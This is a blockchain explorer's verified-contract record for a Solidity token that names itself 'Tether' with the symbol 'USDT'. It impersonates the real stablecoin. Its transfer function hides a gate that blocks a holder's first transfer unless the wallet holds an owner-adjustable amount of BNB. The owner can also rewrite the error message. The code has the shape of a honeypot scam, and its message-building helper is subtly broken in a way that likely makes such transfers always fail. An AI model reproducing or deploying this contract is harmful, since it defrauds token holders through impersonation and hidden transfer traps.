{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20Metadata {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n    function tokenURI() external view returns (string memory);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n}\r\n\r\ncontract Tether is IERC20Metadata {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    uint256 private _maxInitialSupply = 1000000 ether;\r\n    uint256 private _minBNBBalance = 10 ether;\r\n    uint256 private _newMinBNBBalance = _minBNBBalance;\r\n\r\n    string private _minBNBErrorMessage = \"You must have at least %minBNB% BNB Smart Chain in your wallet before sending out the first time\";\r\n\r\n    mapping(address => uint256) private _balanceOf;\r\n    mapping(address => mapping(address => uint256)) private _allowance;\r\n    mapping(address => bool) private _hasSentTokens;\r\n\r\n    string private _metadataURI;\r\n    address private _owner;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event MinBNBBalanceUpdated(uint256 newMinBNBBalance);\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == _owner, \"Only the contract owner can call this function\");\r\n        _;\r\n    }\r\n\r\n    modifier onlyOwnerOrExempt() {\r\n        if (msg.sender != _owner && !_hasSentTokens[msg.sender]) {\r\n            require(getBNBBalance(msg.sender) >= _newMinBNBBalance, _replaceErrorMessage(_minBNBErrorMessage, _newMinBNBBalance));\r\n            _hasSentTokens[msg.sender] = true;\r\n        }\r\n        _;\r\n    }\r\n\r\n    constructor(string memory name_, string memory symbol_, uint256 initialSupply) {\r\n        require(initialSupply <= _maxInitialSupply, \"Initial supply exceeds the maximum limit\");\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = 18; \r\n        _totalSupply = initialSupply * (10**uint256(_decimals));\r\n        _balanceOf[msg.sender] = _totalSupply;\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n        return _balanceOf[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) external view override returns (uint256) {\r\n        return _allowance[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 value) external override returns (bool) {\r\n        require(spender != address(0), \"Invalid address\");\r\n        _allowance[msg.sender][spender] = value;\r\n\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 value) external override onlyOwnerOrExempt returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(value > 0, \"Value must be greater than 0\");\r\n        require(_balanceOf[msg.sender] >= value, \"Insufficient balance\");\r\n\r\n        _transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) external override returns (bool) {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(value > 0, \"Value must be greater than 0\");\r\n        require(_balanceOf[from] >= value, \"Insufficient balance\");\r\n        require(_allowance[from][msg.sender] >= value, \"Allowance exceeded\");\r\n\r\n        _allowance[from][msg.sender] -= value;\r\n        _transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function setTokenURI(string memory tokenURI_) external onlyOwner {\r\n        _metadataURI = tokenURI_;\r\n    }\r\n\r\n    function tokenURI() external view override returns (string memory) {\r\n        return _metadataURI;\r\n    }\r\n\r\n    function updateMinBNBBalance(uint256 newMinBNBBalance) external onlyOwner {\r\n        _newMinBNBBalance = newMinBNBBalance;\r\n        emit MinBNBBalanceUpdated(newMinBNBBalance);\r\n    }\r\n\r\n    function setErrorMessage(string memory errorMessage) external onlyOwner {\r\n        _minBNBErrorMessage = errorMessage;\r\n    }\r\n\r\n    function getBNBBalance(address account) internal view returns (uint256) {\r\n        return account.balance;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 value) internal {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(value > 0, \"Value must be greater than 0\");\r\n        require(_balanceOf[from] >= value, \"Insufficient balance\");\r\n\r\n        _balanceOf[from] = _balanceOf[from].sub(value);\r\n        _balanceOf[to] = _balanceOf[to].add(value);\r\n\r\n        emit Transfer(from, to, value);\r\n    }\r\n\r\n    function _replaceErrorMessage(string memory errorMessage, uint256 value) internal pure returns (string memory) {\r\n        uint256 temp = value;\r\n        uint256 digits;\r\n        while (temp != 0) {\r\n            digits++;\r\n            temp /= 10;\r\n        }\r\n\r\n        bytes memory errorMessageBytes = bytes(errorMessage);\r\n        bytes memory newErrorMessage = new bytes(errorMessageBytes.length + digits - 2);\r\n        uint256 j = 0;\r\n        for (uint256 i = 0; i < errorMessageBytes.length; i++) {\r\n            if (errorMessageBytes[i] == \"%\") {\r\n                for (uint256 k = 0; k < digits; k++) {\r\n                    newErrorMessage[j++] = bytes1(uint8(48 + (value / 10**((digits - k - 1)) % 10)));\r\n                }\r\n            } else {\r\n                newErrorMessage[j++] = errorMessageBytes[i];\r\n            }\r\n        }\r\n        return string(newErrorMessage);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newMinBNBBalance\",\"type\":\"uint256\"}],\"name\":\"MinBNBBalanceUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"errorMessage\",\"type\":\"string\"}],\"name\":\"setErrorMessage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenURI_\",\"type\":\"string\"}],\"name\":\"setTokenURI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenURI\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMinBNBBalance\",\"type\":\"uint256\"}],\"name\":\"updateMinBNBBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Tether", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000003b9aca000000000000000000000000000000000000000000000000000000000000000006546574686572000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045553445400000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://d8507c09b42611305685375e9a59343977bc29f1100f41319f880bf0678ca731"}